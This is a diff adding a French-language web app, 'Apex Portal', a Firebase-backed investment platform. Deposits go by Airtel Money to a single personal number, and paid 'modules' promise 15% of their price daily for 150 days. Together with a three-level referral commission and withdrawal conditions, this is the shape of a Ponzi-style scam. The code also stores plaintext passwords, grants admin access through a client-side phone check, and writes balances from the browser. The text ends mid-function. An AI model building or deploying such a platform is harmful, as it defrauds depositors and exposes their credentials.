@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apex Portal - Digital Services</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome pour les icônes -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Firebase SDK Compat -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <style>
+        .bg-apex-hero {
+            background-image: linear-gradient(to bottom, rgba(5, 15, 30, 0.93), rgba(3, 7, 18, 0.99)), url('https://images.unsplash.com/photo-1559526324-4b87b5e36e44?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+        }
+        #netlify-badge, iframe[src*="netlify"] {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+    </style>
+</head>
+<body class="bg-gray-950 text-gray-100 font-sans min-h-screen flex flex-col select-none bg-apex-hero">
+
+    <!-- ÉCRAN D'AUTHENTIFICATION -->
+    <div id="auth-screen" class="fixed inset-0 bg-gray-950/95 z-50 flex items-center justify-center p-4 backdrop-blur-md">
+        <div class="bg-gray-900 border border-gray-800 rounded-3xl w-full max-w-md p-7 shadow-2xl">
+            <div class="text-center mb-6">
+                <div class="w-16 h-16 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 mx-auto mb-3 flex items-center justify-center shadow-lg">
+                    <i class="fa-solid fa-layer-group text-cyan-400 text-2xl"></i>
+                </div>
+                <h1 class="text-2xl font-extrabold tracking-tight text-white">Apex Portal</h1>
+                <p class="text-xs text-cyan-400 mt-1 uppercase tracking-widest font-bold">Espace Membre</p>
+            </div>
+
+            <div class="flex bg-gray-950 p-1.5 rounded-2xl mb-6 border border-gray-800">
+                <button type="button" id="tab-login" onclick="switchAuthTab('login')" class="flex-1 py-2.5 text-xs font-bold rounded-xl bg-cyan-500 text-gray-950 transition">Connexion</button>
+                <button type="button" id="tab-register" onclick="switchAuthTab('register')" class="flex-1 py-2.5 text-xs font-bold rounded-xl text-gray-400 transition">Inscription</button>
+            </div>
+
+            <!-- Formulaire Connexion -->
+            <form id="form-login" onsubmit="handleLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Numéro de téléphone</label>
+                    <input type="tel" id="login-phone" required placeholder="Ex: 66******" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Mot de passe</label>
+                    <input type="password" id="login-pass" required placeholder="••••••••" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                </div>
+                <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-400 text-gray-950 font-bold py-3 rounded-xl transition shadow-lg">Accéder au compte</button>
+            </form>
+
+            <!-- Formulaire Inscription -->
+            <form id="form-register" onsubmit="handleRegister(event)" class="space-y-4 hidden">
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Numéro de téléphone</label>
+                    <input type="tel" id="reg-phone" required placeholder="Ex: 66******" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Mot de passe</label>
+                    <input type="password" id="reg-pass" required placeholder="••••••••" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Code parrain (Optionnel)</label>
+                    <input type="text" id="reg-ref" placeholder="Ex: APEX-1234" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                </div>
+                <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-400 text-gray-950 font-bold py-3 rounded-xl transition shadow-lg">Créer un compte (+500f de bonus)</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- APPLICATION PRINCIPALE -->
+    <div id="app-screen" class="hidden flex-1 flex flex-col max-w-md mx-auto w-full pb-24">
+        
+        <header class="bg-gray-900/90 border-b border-gray-800 px-4 py-3.5 flex items-center justify-between sticky top-0 z-40 backdrop-blur-md">
+            <div class="flex items-center space-x-3">
+                <div class="w-9 h-9 rounded-xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
+                    <i class="fa-solid fa-chart-line text-sm"></i>
+                </div>
+                <div>
+                    <span class="text-[10px] text-cyan-400 block font-black uppercase tracking-widest">Apex Portal</span>
+                    <span id="user-display-phone" class="text-xs font-bold text-gray-200">---</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-2">
+                <button type="button" id="admin-nav-btn" onclick="openAdminPanel()" class="hidden bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs px-3 py-1.5 rounded-xl font-bold transition">
+                    <i class="fa-solid fa-gauge-high mr-1"></i> Admin
+                </button>
+                <button type="button" onclick="logout()" class="text-gray-400 hover:text-red-400 p-2 transition" title="Déconnexion">
+                    <i class="fa-solid fa-power-off text-base"></i>
+                </button>
+            </div>
+        </header>
+
+        <main class="flex-1 p-4 overflow-y-auto space-y-4">
+            <!-- ACCUEIL -->
+            <div id="tab-content-home" class="space-y-4">
+                <div class="bg-gradient-to-r from-gray-900 to-gray-950 border border-gray-800 rounded-3xl p-5 shadow-2xl relative overflow-hidden">
+                    <div class="absolute -right-8 -top-8 w-36 h-36 bg-cyan-500/10 rounded-full blur-3xl"></div>
+                    <div class="flex justify-between items-start mb-3">
+                        <div>
+                            <span class="text-[11px] text-gray-400 uppercase tracking-wider font-bold">Solde du Compte</span>
+                            <div class="text-3xl font-black text-white mt-0.5"><span id="user-balance">0</span> <span class="text-xs font-medium text-cyan-400">FCFA</span></div>
+                        </div>
+                        <div class="w-10 h-10 bg-cyan-500/10 rounded-2xl flex items-center justify-center border border-cyan-500/20">
+                            <i class="fa-solid fa-wallet text-cyan-400"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-2.5 pt-2">
+                        <button type="button" onclick="switchTabNav('recharge')" class="bg-cyan-500 hover:bg-cyan-400 text-gray-950 text-xs font-bold py-3 px-3 rounded-2xl transition flex items-center justify-center space-x-2 shadow">
+                            <i class="fa-solid fa-arrow-down-left"></i>
+                            <span>Dépôt</span>
+                        </button>
+                        <button type="button" onclick="switchTabNav('withdraw')" class="bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold py-3 px-3 rounded-2xl transition flex items-center justify-center space-x-2 border border-gray-700">
+                            <i class="fa-solid fa-arrow-up-right"></i>
+                            <span>Retrait</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div onclick="switchTabNav('recharge')" class="bg-gray-900/90 border border-gray-800 rounded-2xl p-4 cursor-pointer hover:border-cyan-500/50 transition">
+                        <div class="w-8 h-8 rounded-xl bg-cyan-500/10 flex items-center justify-center text-cyan-400 mb-2">
+                            <i class="fa-solid fa-arrow-down text-sm"></i>
+                        </div>
+                        <span class="text-xs font-bold text-white block">Effectuer un Dépôt</span>
+                        <span class="text-[10px] text-gray-400 block mt-0.5">Rechargez via Airtel Money</span>
+                    </div>
+                    <div onclick="switchTabNav('withdraw')" class="bg-gray-900/90 border border-gray-800 rounded-2xl p-4 cursor-pointer hover:border-cyan-500/50 transition">
+                        <div class="w-8 h-8 rounded-xl bg-cyan-500/10 flex items-center justify-center text-cyan-400 mb-2">
+                            <i class="fa-solid fa-arrow-up text-sm"></i>
+                        </div>
+                        <span class="text-xs font-bold text-white block">Demande de Retrait</span>
+                        <span class="text-[10px] text-gray-400 block mt-0.5">Min 1 000f (Module actif requis)</span>
+                    </div>
+                </div>
+
+                <div class="bg-gray-900 border border-gray-800 rounded-3xl p-5 space-y-3">
+                    <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                        <i class="fa-solid fa-users text-cyan-400"></i>
+                        <span>Programme de Parrainage</span>
+                    </h3>
+                    <p class="text-xs text-gray-400">Partagez votre lien et gagnez 15% de commission sur les activations de vos filleuls.</p>
+                    <div class="bg-gray-950 p-3 rounded-2xl border border-gray-800 text-center space-y-2">
+                        <div id="user-referral-link" class="text-xs font-mono text-cyan-400 break-all select-all">---</div>
+                        <button type="button" onclick="copyReferralLink()" class="bg-cyan-500/10 text-cyan-400 text-xs font-bold py-2 px-4 rounded-xl transition border border-cyan-500/20">Copier le lien</button>
+                    </div>
+                    <div class="grid grid-cols-3 gap-2 text-center pt-1">
+                        <div class="bg-gray-950 p-2.5 rounded-xl border border-gray-800">
+                            <span class="text-[9px] text-gray-400 block">Niveau 1</span>
+                            <span id="team-l1-count" class="text-xs font-bold text-white">0</span>
+                        </div>
+                        <div class="bg-gray-950 p-2.5 rounded-xl border border-gray-800">
+                            <span class="text-[9px] text-gray-400 block">Niveau 2</span>
+                            <span id="team-l2-count" class="text-xs font-bold text-white">0</span>
+                        </div>
+                        <div class="bg-gray-950 p-2.5 rounded-xl border border-gray-800">
+                            <span class="text-[9px] text-gray-400 block">Niveau 3</span>
+                            <span id="team-l3-count" class="text-xs font-bold text-white">0</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-900/60 border border-gray-800 rounded-2xl p-4 text-xs text-gray-300 leading-relaxed space-y-1.5">
+                    <div class="font-bold flex items-center space-x-1.5 text-cyan-400">
+                        <i class="fa-solid fa-shield-halved"></i>
+                        <span>Informations Système</span>
+                    </div>
+                    <p>Rendements versés toutes les 24h (du lundi au vendredi, hors weekend). Durée des modules : 150 jours. Frais de retrait : 10% (min 1 000f, module actif requis).</p>
+                </div>
+            </div>
+
+            <!-- PRODUITS (BOUTIQUE & ACTIFS) -->
+            <div id="tab-content-vip" class="space-y-4 hidden">
+                <div>
+                    <h2 class="text-lg font-bold text-white">Catalogue des Modules (1 à 20)</h2>
+                    <p class="text-xs text-gray-400">Durée de chaque formule : 150 jours.</p>
+                </div>
+                <div id="vip-packs-container" class="space-y-3"></div>
+
+                <div class="pt-2">
+                    <h2 class="text-lg font-bold text-white mb-1">Mes Modules Actifs</h2>
+                    <p class="text-xs text-gray-400 mb-3">Suivi et versements journaliers.</p>
+                    <div id="active-products-container" class="space-y-3"></div>
+                </div>
+            </div>
+
+            <!-- DÉPÔT -->
+            <div id="tab-content-recharge" class="space-y-4 hidden">
+                <div class="bg-gray-900 border border-gray-800 rounded-3xl p-5 space-y-4">
+                    <h2 class="text-lg font-bold text-white">Effectuer un Dépôt</h2>
+                    <p class="text-xs text-gray-400">Transférez le montant souhaité sur le numéro officiel Airtel Money, puis saisissez votre référence de transaction.</p>
+                    
+                    <div class="space-y-2">
+                        <div class="bg-gray-950 p-3.5 rounded-2xl border border-gray-800 flex items-center justify-between">
+                            <div>
+                                <span class="text-[10px] uppercase font-bold text-cyan-400 block">Airtel Money Officiel</span>
+                                <span class="text-sm font-mono font-bold text-white">64192087</span>
+                            </div>
+                            <button type="button" onclick="copyText('64192087')" class="bg-gray-800 hover:bg-gray-700 text-gray-200 px-3 py-1.5 rounded-xl text-xs transition font-semibold">Copier</button>
+                        </div>
+                    </div>
+
+                    <form onsubmit="submitRecharge(event)" class="space-y-3 pt-2">
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Montant déposé (FCFA)</label>
+                            <input type="number" id="recharge-amount" required min="500" placeholder="Ex: 5000" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Référence / ID de transaction</label>
+                            <input type="text" id="recharge-ref" required placeholder="Ex: Réf de votre transfert" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                        </div>
+                        <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-400 text-gray-950 font-bold py-3 rounded-xl transition shadow">Valider la recharge</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- RETRAIT -->
+            <div id="tab-content-withdraw" class="space-y-4 hidden">
+                <div class="bg-gray-900 border border-gray-800 rounded-3xl p-5 space-y-4">
+                    <h2 class="text-lg font-bold text-white">Compte de Retrait</h2>
+                    <form onsubmit="saveWithdrawAccount(event)" class="space-y-3">
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Nom du titulaire</label>
+                            <input type="text" id="acc-name" required placeholder="Nom et prénom" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2.5 text-sm text-white">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Numéro de réception</label>
+                            <input type="tel" id="acc-phone" required placeholder="Ex: 66******" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2.5 text-sm text-white">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Opérateur</label>
+                            <select id="acc-operator" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2.5 text-sm text-white">
+                                <option value="Airtel Money">Airtel Money</option>
+                                <option value="Moov Money">Moov Money</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Mot de passe de sécurité</label>
+                            <input type="password" id="acc-pass" required placeholder="••••••••" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2.5 text-sm text-white">
+                        </div>
+                        <button type="submit" class="w-full bg-gray-800 hover:bg-gray-700 text-gray-200 font-bold py-2.5 rounded-xl transition text-xs border border-gray-700">Enregistrer</button>
+                    </form>
+                </div>
+
+                <div class="bg-gray-900 border border-gray-800 rounded-3xl p-5 space-y-4">
+                    <h2 class="text-lg font-bold text-white">Demande de Retrait</h2>
+                    <p class="text-xs text-gray-400">Du Lundi au Vendredi (10h00 - 17h00) | Min : 1 000f | Frais : 10% | <span class="text-cyan-400 font-bold">Module actif obligatoire</span></p>
+                    
+                    <form onsubmit="submitWithdraw(event)" class="space-y-3">
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-400 mb-1">Montant (FCFA)</label>
+                            <input type="number" id="withdraw-amount" required min="1000" placeholder="Ex: 5000" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-cyan-500 text-white">
+                        </div>
+                        <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-400 text-gray-950 font-bold py-3 rounded-xl transition shadow">Effectuer le retrait</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- JOURNAL D'OPÉRATIONS (HISTORIQUE) -->
+            <div id="tab-content-history" class="space-y-4 hidden">
+                <div>
+                    <h2 class="text-lg font-bold text-white">Journal d'Opérations</h2>
+                    <p class="text-xs text-gray-400">Suivi détaillé de vos transactions en temps réel.</p>
+                </div>
+                <div id="history-container" class="space-y-2"></div>
+            </div>
+
+            <!-- MOI (SUPPORT & GROUPE WHATSAPP) -->
+            <div id="tab-content-profile" class="space-y-4 hidden">
+                <div class="bg-gray-900 border border-gray-800 rounded-3xl p-5 space-y-4">
+                    <h2 class="text-lg font-bold text-white">Mon Profil & Support</h2>
+                    
+                    <div class="bg-gray-950 p-4 rounded-2xl border border-gray-800 flex items-center justify-between">
+                        <div>
+                            <span class="text-[10px] uppercase font-bold text-cyan-400 block">Ligne d'Assistance</span>
+                            <span class="text-sm font-mono font-bold text-white">64192087</span>
+                        </div>
+                        <button type="button" onclick="copyText('64192087')" class="bg-gray-800 text-gray-200 px-3 py-1.5 rounded-xl text-xs">Copier</button>
+                    </div>
+
+                    <a href="https://chat.whatsapp.com/KW0dBLRJzqJ4lT3J53SM32?s=cl&p=a&iam=2" target="_blank" class="block bg-emerald-600 hover:bg-emerald-500 text-white text-center font-bold py-3 rounded-2xl transition text-xs shadow">
+                        <i class="fa-brands fa-whatsapp text-base mr-1"></i> Rejoindre le groupe WhatsApp officiel
+                    </a>
+                </div>
+            </div>
+
+        </main>
+
+        <!-- Navigation du bas -->
+        <nav class="bg-gray-900/95 border-t border-gray-800 fixed bottom-0 left-0 right-0 max-w-md mx-auto z-40 flex justify-around py-3 px-1 backdrop-blur-md">
+            <button type="button" onclick="switchTabNav('home')" id="nav-btn-home" class="flex flex-col items-center text-cyan-400 transition px-4">
+                <i class="fa-solid fa-house text-lg"></i>
+                <span class="text-[10px] mt-1 font-bold">Accueil</span>
+            </button>
+            <button type="button" onclick="switchTabNav('vip')" id="nav-btn-vip" class="flex flex-col items-center text-gray-400 hover:text-gray-200 transition px-4">
+                <i class="fa-solid fa-gem text-lg"></i>
+                <span class="text-[10px] mt-1">Modules</span>
+            </button>
+            <button type="button" onclick="switchTabNav('history')" id="nav-btn-history" class="flex flex-col items-center text-gray-400 hover:text-gray-200 transition px-4">
+                <i class="fa-solid fa-clock-rotate-left text-lg"></i>
+                <span class="text-[10px] mt-1">Historique</span>
+            </button>
+            <button type="button" onclick="switchTabNav('profile')" id="nav-btn-profile" class="flex flex-col items-center text-gray-400 hover:text-gray-200 transition px-4">
+                <i class="fa-solid fa-user text-lg"></i>
+                <span class="text-[10px] mt-1">Moi</span>
+            </button>
+        </nav>
+    </div>
+
+    <!-- MODALE ADMIN -->
+    <div id="admin-modal" class="hidden fixed inset-0 bg-gray-950/95 z-50 flex flex-col p-4 overflow-y-auto backdrop-blur-md">
+        <div class="max-w-2xl mx-auto w-full space-y-4">
+            <div class="flex items-center justify-between border-b border-gray-800 pb-3">
+                <h2 class="text-xl font-bold text-cyan-400"><i class="fa-solid fa-gauge-high mr-2"></i> Console Admin Apex</h2>
+                <button type="button" onclick="closeAdminPanel()" class="text-gray-400 hover:text-white text-xs px-3 py-1.5 bg-gray-900 rounded-xl font-bold">Fermer</button>
+            </div>
+
+            <div class="flex bg-gray-900 p-1 rounded-2xl border border-gray-800 text-xs">
+                <button type="button" onclick="switchAdminTab('users')" id="admin-tab-users" class="flex-1 py-2 font-bold rounded-xl bg-cyan-500 text-gray-950 transition">Utilisateurs</button>
+                <button type="button" onclick="switchAdminTab('recharges')" id="admin-tab-recharges" class="flex-1 py-2 font-bold rounded-xl text-gray-400 transition">Dépôts</button>
+                <button type="button" onclick="switchAdminTab('withdrawals')" id="admin-tab-withdrawals" class="flex-1 py-2 font-bold rounded-xl text-gray-400 transition">Retraits</button>
+                <button type="button" onclick="switchAdminTab('grant')" id="admin-tab-grant" class="flex-1 py-2 font-bold rounded-xl text-gray-400 transition">Attribuer</button>
+            </div>
+
+            <div id="admin-content-users" class="space-y-3">
+                <div class="text-xs text-cyan-400 font-bold">Gestion des Membres en Temps Réel</div>
+                <div id="admin-users-list" class="space-y-3"></div>
+            </div>
+
+            <div id="admin-content-recharges" class="space-y-3 hidden">
+                <div class="text-xs text-gray-400 font-bold">Dépôts en attente</div>
+                <div id="admin-recharges-list" class="space-y-2"></div>
+            </div>
+
+            <div id="admin-content-withdrawals" class="space-y-3 hidden">
+                <div class="text-xs text-gray-400 font-bold">Retraits en attente</div>
+                <div id="admin-withdrawals-list" class="space-y-2"></div>
+            </div>
+
+            <div id="admin-content-grant" class="space-y-4 hidden bg-gray-900 border border-gray-800 rounded-2xl p-4">
+                <div class="text-xs text-cyan-400 font-bold uppercase">Attribution Manuelle</div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Téléphone cible</label>
+                    <input type="tel" id="admin-target-phone" placeholder="Ex: 67******" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2 text-sm text-white">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">ID Module (1 à 20)</label>
+                    <input type="number" id="admin-target-vip" min="0" max="20" placeholder="0 pour aucun" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2 text-sm text-white">
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-gray-400 mb-1">Solde à ajouter (FCFA)</label>
+                    <input type="number" id="admin-target-balance" placeholder="0" class="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2 text-sm text-white">
+                </div>
+                <button type="button" onclick="adminGrantPackageOrBalance()" class="w-full bg-cyan-500 hover:bg-cyan-400 text-gray-950 font-bold py-2.5 rounded-xl transition text-xs">Exécuter</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGIQUE SCRIPT -->
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCV0ah2RiZkWP_mPxgr0PDMZc9TltlnAq8",
+            authDomain: "apex-wealth-e0455.firebaseapp.com",
+            databaseURL: "https://apex-wealth-e0455-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "apex-wealth-e0455",
+            storageBucket: "apex-wealth-e0455.firebasestorage.app",
+            messagingSenderId: "355511606139",
+            appId: "1:355511606139:web:58de16b3e6e1ee3a20fbde"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const vipPacksData = [];
+        for (let i = 1; i <= 20; i++) {
+            let basePrice = i * 5000;
+            let dailyGain = Math.round(basePrice * 750 / 5000);
+            vipPacksData.push({
+                id: i,
+                name: `Module Numéro ${i}`,
+                price: basePrice,
+                daily: dailyGain,
+                duration: 150
+            });
+        }
+
+        let currentUserPhone = null;
+
+        window.onload = function() {
+            const savedPhone = localStorage.getItem('apex_logged_phone');
+            if (savedPhone) {
+                currentUserPhone = savedPhone;
+                document.getElementById('auth-screen').classList.add('hidden');
+                document.getElementById('app-screen').classList.remove('hidden');
+                initUserData(savedPhone);
+            } else {
+                currentUserPhone = null;
+                document.getElementById('auth-screen').classList.remove('hidden');
+                document.getElementById('app-screen').classList.add('hidden');
+            }
+            renderVipPacks();
+            checkUrlReferral();
+        };
+
+        function checkUrlReferral() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const ref = urlParams.get('ref');
+            if (ref) {
+                document.getElementById('reg-ref').value = ref;
+                switchAuthTab('register');
+            }
+        }
+
+        function switchAuthTab(type) {
+            if (type === 'login') {
+                document.getElementById('tab-login').className = "flex-1 py-2.5 text-xs font-bold rounded-xl bg-cyan-500 text-gray-950 transition";
+                document.getElementById('tab-register').className = "flex-1 py-2.5 text-xs font-bold rounded-xl text-gray-400 transition";
+                document.getElementById('form-login').classList.remove('hidden');
+                document.getElementById('form-register').classList.add('hidden');
+            } else {
+                document.getElementById('tab-register').className = "flex-1 py-2.5 text-xs font-bold rounded-xl bg-cyan-500 text-gray-950 transition";
+                document.getElementById('tab-login').className = "flex-1 py-2.5 text-xs font-bold rounded-xl text-gray-400 transition";
+                document.getElementById('form-register').classList.remove('hidden');
+                document.getElementById('form-login').classList.add('hidden');
+            }
+        }
+
+        function handleLogin(e) {
+            e.preventDefault();
+            const phone = document.getElementById('login-phone').value.trim();
+            const pass = document.getElementById('login-pass').value.trim();
+
+            db.ref('users/' + phone).once('value').then(snapshot => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    if (data.pass === pass) {
+                        localStorage.setItem('apex_logged_phone', phone);
+                        currentUserPhone = phone;
+                        document.getElementById('auth-screen').classList.add('hidden');
+                        document.getElementById('app-screen').classList.remove('hidden');
+                        initUserData(phone);
+                    } else {
+                        alert("Mot de passe incorrect.");
+                    }
+                } else {
+                    alert("Ce numéro n'existe pas. Veuillez vous inscrire.");
+                }
+            });
+        }
+
+        function handleRegister(e) {
+            e.preventDefault();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const pass = document.getElementById('reg-pass').value.trim();
+            const refCodeInput = document.getElementById('reg-ref').value.trim();
+
+            db.ref('users/' + phone).once('value').then(snapshot => {
+                if (snapshot.exists()) {
+                    alert("Ce numéro est déjà enregistré.");
+                } else {
+                    const myRefCode = "APEX-" + Math.floor(1000 + Math.random() * 9000);
+                    const dateStr = new Date().toLocaleString();
+                    
+                    db.ref('users/' + phone).set({
+                        phone: phone,
+                        pass: pass,
+                        balance: 500,
+                        referralCode: myRefCode,
+                        invitedBy: refCodeInput || "",
+                        createdAt: new Date().toISOString()
+                    }).then(() => {
+                        db.ref('transactions/' + phone).push({
+                            type: "Bonus d'inscription",
+                            amount: 500,
+                            date: dateStr,
+                            status: "Validé"
+                        });
+
+                        if (refCodeInput) {
+                            db.ref('users').orderByChild('referralCode').equalTo(refCodeInput).once('value').then(refSnap => {
+                                if (refSnap.exists()) {
+                                    const sponsorPhone = Object.keys(refSnap.val())[0];
+                                    db.ref(`users/${sponsorPhone}/team/l1/${phone}`).set({
+                                        phone: phone,
+                                        joinedDate: dateStr
+                                    });
+                                }
+                            });
+                        }
+                        localStorage.setItem('apex_logged_phone', phone);
+                        currentUserPhone = phone;
+                        document.getElementById('auth-screen').classList.add('hidden');
+                        document.getElementById('app-screen').classList.remove('hidden');
+                        initUserData(phone);
+                        alert("Compte créé avec succès ! +500 FCFA de bonus offerts.");
+                    });
+                }
+            });
+        }
+
+        function logout() {
+            localStorage.removeItem('apex_logged_phone');
+            currentUserPhone = null;
+            document.getElementById('auth-screen').classList.remove('hidden');
+            document.getElementById('app-screen').classList.add('hidden');
+        }
+
+        function switchTabNav(tab) {
+            ['home', 'vip', 'recharge', 'withdraw', 'history', 'profile'].forEach(t => {
+                const el = document.getElementById('tab-content-' + t);
+                const btn = document.getElementById('nav-btn-' + t);
+                if (el) el.classList.add('hidden');
+                if (btn) btn.className = "flex flex-col items-center text-gray-400 hover:text-gray-200 transition px-4";
+            });
+            const activeEl = document.getElementById('tab-content-' + tab);
+            const activeBtn = document.getElementById('nav-btn-' + tab);
+            if (activeEl) activeEl.classList.remove('hidden');
+            if (activeBtn) activeBtn.className = "flex flex-col items-center text-cyan-400 transition px-4";
+        }
+
+        function initUserData(phone) {
+            document.getElementById('user-display-phone').innerText = phone;
+            
+            if (phone === "64192087") {
+                document.getElementById('admin-nav-btn').classList.remove('hidden');
+            } else {
+                document.getElementById('admin-nav-btn').classList.add('hidden');
+            }
+
+            const userRef = db.ref('users/' + phone);
+            userRef.on('value', snapshot => {
+                if (snapshot.exists()) {
+                    let data = snapshot.val();
+                    let balance = Number(data.balance) || 0;
+                    let activePacks = data.activePacks || {};
+                    let now = Date.now();
+                    let currentDate = new Date(now);
+                    let dayOfWeek = currentDate.getDay();
+                    let isWeekend = (dayOfWeek === 0 || dayOfWeek === 6);
+                    let updated = false;
+
+                    if (!isWeekend) {
+                        Object.keys(activePacks).forEach(packKey => {
+                            let pack = activePacks[packKey];
+                            if (!pack.completed) {
+                                let lastClaim = pack.lastClaimTime || pack.purchaseTime;
+                                let hoursPassed = (now - lastClaim) / (1000 * 60 * 60);
+
+                                if (hoursPassed >= 24) {
+                                    let days = Math.floor(hoursPassed / 24);
+                                    let totalDaysElapsed = (pack.daysClaimed || 0) + days;
+
+                                    if (totalDaysElapsed >= pack.duration) {
+                                        days = pack.duration - (pack.daysClaimed || 0);
+                                        pack.completed = true;
+                                    }
+
+                                    if (days > 0) {
+                                        balance += (days * pack.daily);
+                                        pack.daysClaimed = (pack.daysClaimed || 0) + days;
+                                        pack.lastClaimTime = lastClaim + (days * 24 * 60 * 60 * 1000);
+                                        updated = true;
+                                    }
+                                }
+                            }
+                        });
+                    }
+
+                    if (updated) {
+                        userRef.update({ balance: balance, activePacks: activePacks });
+                    }
+
+                    document.getElementById('user-balance').innerText = balance.toLocaleString();
+                    
+                    const refLink = window.location.origin + window.location.pathname + "?ref=" + (data.referralCode || "APEX");
+                    document.getElementById('user-referral-link').innerText = refLink;
+
+                    document.getElementById('team-l1-count').innerText = data.team && data.team.l1 ? Object.keys(data.team.l1).length : 0;
+                    document.getElementById('team-l2-count').innerText = data.team && data.team.l2 ? Object.keys(data.team.l2).length : 0;
+                    document.getElementById('team-l3-count').innerText = data.team && data.team.l3 ? Object.keys(data.team.l3).length : 0;
+
+                    renderActiveProducts(activePacks);
+                    loadHistory(phone);
+                }
+            });
+        }
+
+        function formatCountdown(targetTimeMs) {
+            let diff = targetTimeMs - Date.now();
+            if (diff <= 0) return "Disponible";
+            let h = Math.floor(diff / (1000 * 60 * 60));
+            let m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            return `${h}h ${m}m restants`;
+        }
+
+        function renderVipPacks() {
+            const container = document.getElementById('vip-packs-container');
+            if (!container) return;
+            container.innerHTML = "";
+            vipPacksData.forEach(pack => {
+                container.innerHTML += `
+                    <div class="bg-gray-900 border border-gray-800 rounded-2xl p-4 flex items-center justify-between">
+                        <div>
+                            <span class="text-sm font-bold text-white block">${pack.name}</span>
+                            <span class="text-[10px] text-cyan-400 font-bold">Durée : ${pack.duration} Jours</span>
+                            <div class="text-xs text-gray-400 mt-1">Prix : <b class="text-white">${pack.price.toLocaleString()}f</b> | Gain/jr : <b class="text-cyan-400">${pack.daily.toLocaleString()}f</b></div>
+                        </div>
+                        <button type="button" onclick="buyVip(${pack.id}, ${pack.price})" class="bg-cyan-500 hover:bg-cyan-400 text-gray-950 text-xs font-bold py-2.5 px-4 rounded-xl shadow">Activer</button>
+                    </div>
+                `;
+            });
+        }
+
+        function buyVip(vipId, price) {
+            const userRef = db.ref('users/' + currentUserPhone);
+            userRef.once('value').then(snapshot => {
+                let data = snapshot.val();
+                let balance = Number(data.balance) || 0;
+                if (balance < price) {
+                    alert("Solde insuffisant pour souscrire à ce module.");
+                    switchTabNav('recharge');
+                    return;
+                }
